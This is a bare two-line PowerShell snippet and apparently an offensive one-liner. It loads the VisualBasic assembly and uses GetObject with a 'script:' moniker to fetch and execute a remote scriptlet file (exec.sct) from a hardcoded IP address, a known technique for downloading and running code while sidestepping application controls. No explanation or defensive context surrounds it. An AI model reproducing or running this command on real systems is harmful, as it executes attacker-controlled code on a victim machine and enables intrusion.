[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');
[Microsoft.VisualBasic.Interaction]::GetObject('script:http://192.168.154.200/exec.sct').Exec(0)
